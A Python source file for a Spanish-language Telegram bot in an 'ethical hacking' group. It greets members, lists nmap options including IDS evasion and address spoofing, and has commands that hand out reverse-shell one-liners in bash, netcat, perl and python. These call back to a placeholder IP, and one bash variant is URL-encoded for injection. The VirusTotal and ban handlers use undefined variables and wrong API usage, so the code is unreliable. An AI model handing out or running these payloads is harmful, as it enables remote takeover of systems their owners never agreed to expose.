import telebot, time, os, requests, json, random


Token = '<tu token>'
vt_api_key = '<tu token>'

bot = telebot.TeleBot(Token)

# -------Bienvenida
print('bienve')

# Manejar el evento de nuevos miembros en un grupo
@bot.message_handler(func=lambda message: True, content_types=['new_chat_members'])
def welcome_message(message):
    welcome_messages = [
        f'¬°Bienvenid@ {message.from_user.first_name} a este grupo de hacking √©tico! Presentate, Hackea y pasalo genial.',
        f'¬°Hola {message.from_user.first_name}! Bienvenid@ a este grupo. Estas Hack?',
        f'¬°Saludos {message.from_user.first_name}! Bienvenid@ a √©sta comunidad de Cyber. Si tienes alguna pregunta √©tica, no dudes en hacerla.',
        f'{message.from_user.first_name}, s√© bienvenid@ al grupo m√°s hack, a disfrutar!']
    random_welcome = random.choice(welcome_messages)
    bot.reply_to(message, random_welcome)


# -------Comandos
print('coman')

@bot.message_handler(commands=['pentest'])  # --Llamada a bot
def init(message):
    user_name = message.from_user.first_name
    bot.reply_to(message, 'Hola {}, de momento estoy en version alfa, pero si utilizas /help, podras ver los comandos que de momento tengo disponibles.'.format(user_name))
    print('pingu')

@bot.message_handler(commands=['nmap'])  # --Listado de comandos nmap
def nmap(message):
    user_name = message.from_user.first_name
    bot.reply_to(message, 'Hola {}, los comandos de nmap son los siguientes: \n \n -->Descubrir sistemas: \n -PS n tcp syn ping \n -PA n ping TCP ACK \n -PU n ping UDP \n -PM Netmask Req \n -PP Timestamp Req \n -PE Echo Req \n -sL an√°lisis de listado \n -PO ping por protocolo \n -PN No hacer ping \n -n no hacer DNS \n -R Resolver DNS en todos los sistemas objetivo \n ‚Äìtraceroute: trazar ruta al sistema (para topolog√≠as de red) \n -sP realizar ping, igual que con ‚ÄìPP ‚ÄìPM ‚ÄìPS443 ‚ÄìPA80 \n \n -->T√©cnicas de an√°lisis de puertos: \n -sS an√°lisis utilizando TCP SYN \n -sT an√°lisis utilizando TCP CONNECT \n -sU an√°lisis utilizando UDP \n -sY an√°lisis utilizando SCTP INIT \n -sZ utilizando COOKIE ECHO de SCTP \n -sO protocolo IP \n -sW ventana TCP -sN \n ‚ÄìsF -sX NULL, FIN, XMAS \n ‚ÄìsA TCP ACK \n \n -->Puertos a analizar y orden de an√°lisis: \n -p n-mrango \n -p‚Äì todos los puertos \n -p n,m,z especificados \n -p U:n-m,z T:n,m U para UDP, T para TCP \n  -F r√°pido, los 100 comunes \n ‚Äìtop-ports n analizar los puertos m√°s utilizados \n -r no aleatorio \n \n -->Duraci√≥n y ejecuci√≥n: \n -T0 paranoico \n -T1 sigiloso \n -T2 sofisticado \n -T3 normal \n -T4 agresivo \n -T5 locura \n ‚Äìmin-hostgroup \n ‚Äìmax-hostgroup \n ‚Äìmin-rate \n ‚Äìmax-rate \n ‚Äìmin-parallelism \n ‚Äìmax-parallelism \n ‚Äìmin-rtt-timeout \n ‚Äìmax-rtt-timeout \n ‚Äìinitial-rtt-timeout \n ‚Äìmax-retries \n ‚Äìhost-timeout ‚Äìscan-delay \n \n -->Detecci√≥n de servicios y versiones: \n -sV: detecci√≥n de la versi√≥n de servicios \n ‚Äìall-ports no excluir puertos \n ‚Äìversion-all probar cada exploraci√≥n \n ‚Äìversion-trace rastrear la actividad del an√°lisis de versi√≥n-O activar detecci√≥n del S. Operativo \n ‚Äìfuzzy adivinar detecci√≥n del SO \n ‚Äìmax-os-tries establecer n√∫mero m√°ximo de intentos contra el sistema objetivo \n \n -->Evasi√≥n de Firewalls/IDS: \n -f fragmentar paquetes \n -D d1,d2 encubrir an√°lisis con se√±uelos \n -S ip falsear direcci√≥n origen \n ‚Äìg source falsear puerto origen \n ‚Äìrandomize-hosts orden \n ‚Äìspoof-mac <mac> cambiar MAC de origen \n \n -->Par√°metros de nivel de detalle y depuraci√≥n: \n -v Incrementar el nivel de detalle \n ‚Äìreason motivos por sistema y puerto \n -d (1-9) establecer nivel de depuraci√≥n \n ‚Äìpacket-trace ruta de paquetes \n \n -->Otras opciones: \n ‚Äìresume file continuar an√°lisis abortado (tomando formatos de salida con -oN o -oG) \n -6 activar an√°lisis IPV6 \n -A agresivo, igual que con -O -sV -sC ‚Äìtraceroute \n \n -->Opciones interactivas: \n v/V aumentar/disminuir nivel de detalle del an√°lisis \n d/D aumentar/disminuir nivel de depuraci√≥n \n p/P activar/desactivar traza de paquetes \n \n -->Scripts: \n -sC realizar an√°lisis con los scripts por defecto \n ‚Äìscript file ejecutar script (o todos) \n ‚Äìscript-args n=v proporcionar argumentos \n ‚Äìscript-trace mostrar comunicaci√≥n entrante y saliente \n \n -->Formatos de salida: \n -oN guardar en formato normal \n -oX guardar en formato XML \n -oG guardar en formato para posteriormente usar Grep(una linea) \n -oA guardar en todos los formatos anteriores'.format(user_name))
    print('nmap')

@bot.message_handler(commands=['reverse_sh'])  # --reverse shell bash 
def reverse_sh_tcp(message):
    user_name = message.from_user.first_name
    bot.reply_to(message, 'Hola {}, mis sugerencias para realizar una reverse shell con bash son las siguientes: \n'.format(user_name) + '\nTCP\n' + '\n bash -i >& /dev/tcp/<tu ip>/443 0>&1\n'+'\nbash -l > /dev/tcp/<tu ip>/443 0<&1 2>&1\n'+'\nsh -i 5<> /dev/tcp/<tu ip>/443 0<&5 1>&5 2>&5\n'+'\nbash -c "bash -i >& /dev/tcp/<tu ip>/443 0>&1"0<&196;exec 196<>/dev/tcp/<tu ip>/443; sh <&196 >&196 2>&196\n'+'\nexec 5<>/dev/tcp/<tu ip>/443;cat <&5 | while read line; do $line 2>&5 >&5; done\n'+'\n----------\n'+'\nUDP\n'+'sh -i >& /dev/udp/<tu ip>/443 0>&1'+'\n----------\n'+'\nURL ENCODE\n'+'\nbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<tu ip>%2F443%200%3E%261%22')
    print('reverse')

@bot.message_handler(commands=['reverse_nc'])  # --reverse shell net cat 
def reverse_sh_tcp(message):
    user_name = message.from_user.first_name
    bot.reply_to(message, 'Hola {}, mis sugerencias para realizar una reverse shell con netcat son las siguientes: \n'.format(user_name) + '\nLINUX\n'+'\nnc -e /bin/sh <tu ip> 443'+'nc -e /bin/bash <tu ip> 443\n'+'\nnc -c /bin/sh <tu ip> 443'+'nc -c /bin/bash <tu ip> 443\n'+'\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <tu ip> 443 >/tmp/f\n'+'\nWINDOWS\n'+'\nnc.exe -e cmd <tu ip> 443\n'+'\n\\\<tu ip>\a\\nc.exe -e cmd <tu ip> 443')
    print('reverse')

@bot.message_handler(commands=['reverse_perl'])  # --reverse shell perl
def reverse_perl(message):
    user_name = message.from_user.first_name
    bot.reply_to(message, 'Hola {}, mis sugerencias para realizar una reverse shell con perl son las siguientes: \n'.format(user_name) + 'perl -e \'use Socket;$i="<ip>";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\' \n' + '\n' + 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<ip>:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\' \n' + '\n' + '(solo en windows) perl -MIO -e \'$c=new IO::Socket::INET(PeerAddr,"<ip>:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'')
    print('reverse')

@bot.message_handler(commands=['reverse_py'])  # --reverse shell python ipv4
def reverse_py_ipv4(message):
    user_name = message.from_user.first_name
    bot.reply_to(message, 'Hola {}, mis sugerencias para realizar una reverse shell con python son las siguientes: \n'.format(user_name) + 'Solo Linux : \n' + 'export RHOST="<ip>";export RPORT=4242;python -c \'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")\'' )
    print('reverse')

@bot.message_handler(commands=['help'])
def send_help(message):
    user_name = message.from_user.first_name
    bot.reply_to(message, "Hola {}, puedes enviar un archivo para que lo analice VirusTotal o probar con uno de estos comandos:\n /pentest - llama al bot\n /nmap - Listado de comandos de Nmap\n  --> ejemplos de scripts para reverse shell üëáüèª\n /reverse_sh\n /reverse_perl\n /reverse_py\n /reverse_nc".format(user_name))
    print('help')


# -------VirusTotal
print('vt')

# Manejador de archivos recibidos
@bot.message_handler(content_types=['document'])
def handle_document(message):
    # Obtiene el archivo adjunto del mensaje
    file_id = message.document.file_id
    file_info = bot.get_file(file_id)
    file_url = f"https://api.telegram.org/file/bot{TELEGRAM_TOKEN}/{file_info.file_path}"
    
    # Realiza la solicitud a la API de VirusTotal
    url = 'https://www.virustotal.com/api/v3/files'
    headers = {
        'x-apikey': API_KEY
    }
    params = {
        'url': file_url
    }
    response = requests.post(url, headers=headers, params=params)
    
    # Procesa la respuesta de VirusTotal
    if response.status_code == 200:
        json_response = response.json()
        scan_id = json_response['data']['id']
        scan_result = json_response['data']['attributes']['last_analysis_stats']
        positive_engines = scan_result['malicious']
        
        if positive_engines > 0:
            bot.reply_to(message, "PELIGRO: Este archivo contiene virus.")
            # Eliminar mensaje si el archivo es positivo
            bot.delete_message(message.chat.id, message.message_id)
        else:
            bot.reply_to(message, "Puedes utilizar tranquilo este archivo.")
    else:
        bot.reply_to(message, "Hubo un error al escanear el archivo.")


#-------comandos Propietario Grupo
print('prop')

# Comando para banear a usuarios
@bot.message_handler(commands=['ban'])
def banear_usuario(message):
    # Verificar si el mensaje es de un grupo
    if message.chat.type == 'group' or message.chat.type == 'supergroup':
        # Obtener los administradores del grupo
        administrators = bot.get_chat_administrators(message.chat.id)
        # Verificar si el usuario que ejecuta el comando es el propietario
        for admin in administrators:
            if admin.status == 'creator' and admin.user.id == message.from_user.id:
                # Comprobar si se proporcion√≥ un argumento (nombre de usuario) junto al comando
                if len(message.text.split()) > 1:
                    username = message.text.split()[1]
                    # Realizar la acci√≥n de banear al usuario
                    banear_accion(message.chat.id, username)
                    bot.reply_to(message, f"Usuario {username} baneado correctamente.")
                else:
                    bot.reply_to(message, "Debes proporcionar el nombre de usuario junto al comando.")
                return
        
        bot.reply_to(message, "Lo siento, solo el propietario del grupo puede ejecutar este comando.")
        
    else:
        bot.reply_to(message, "Este comando solo se puede ejecutar en un grupo o supergrupo.")


# Comando para desbanear a usuarios
@bot.message_handler(commands=['unban'])
def desbanear_usuario(message):
    # Verificar si el mensaje es de un grupo
    if message.chat.type == 'group' or message.chat.type == 'supergroup':
        # Obtener los administradores del grupo
        administrators = bot.get_chat_administrators(message.chat.id)
        # Verificar si el usuario que ejecuta el comando es el propietario del grupo
        for admin in administrators:
            if admin.status == 'creator' and admin.user.id == message.from_user.id:
                # Comprobar si se proporcion√≥ un argumento (nombre de usuario) junto al comando
                if len(message.text.split()) > 1:
                    username = message.text.split()[1]
                    # Realizar la acci√≥n de desbanear al usuario
                    desbanear_accion(message.chat.id, username)
                    bot.reply_to(message, f"Usuario {username} desbaneado correctamente.")
                else:
                    bot.reply_to(message, "Debes proporcionar el nombre de usuario junto al comando.")
                return
        
        bot.reply_to(message, "Lo siento, solo el propietario del grupo puede ejecutar este comando.")
        
    else:
        bot.reply_to(message, "Este comando solo se puede ejecutar en un grupo o supergrupo.")


# Funci√≥n para realizar la acci√≥n de banear al usuario
def banear_accion(chat_id, username):
    try:
        # Obtener el ID de usuario a partir del nombre de usuario
        user = bot.get_chat_member(chat_id, username)
        if user:
            user_id = user.user.id
            # Ejecutar la acci√≥n de banear al usuario en el grupo o supergrupo
            bot.restrict_chat_member(chat_id, user_id, can_send_messages=False)
            # Aqu√≠ tambi√©n puedes realizar otras acciones, como eliminar mensajes o restringir otros permisos
        else:
            print(f"No se encontr√≥ el usuario especificado: {username}")
        
    except telebot.apihelper.ApiException as e:
        # Manejar cualquier error que ocurra durante la acci√≥n de banear
        print(f"Error al banear al usuario {username}: {e}")


# Funci√≥n para realizar la acci√≥n de desbanear al usuario
def desbanear_accion(chat_id, username):
    try:
        # Obtener el ID de usuario a partir del nombre de usuario
        user = bot.get_chat_member(chat_id, username)
        if user:
            user_id = user.user.id
            # Ejecutar la acci√≥n de desbanear al usuario en el grupo o supergrupo
            bot.restrict_chat_member(chat_id, user_id, can_send_messages=True)
            # Aqu√≠ tambi√©n puedes realizar otras acciones, como restaurar permisos previos
        else:
            print(f"No se encontr√≥ el usuario especificado: {username}")
        
    except telebot.apihelper.ApiException as e:
        # Manejar cualquier error que ocurra durante la acci√≥n de desbanear
        print(f"Error al desbanear al usuario {username}: {e}")

user = telebot.TeleBot.get_me
print(user)
print('\n')
update = telebot.TeleBot.get_updates
print(update)

bot.polling()
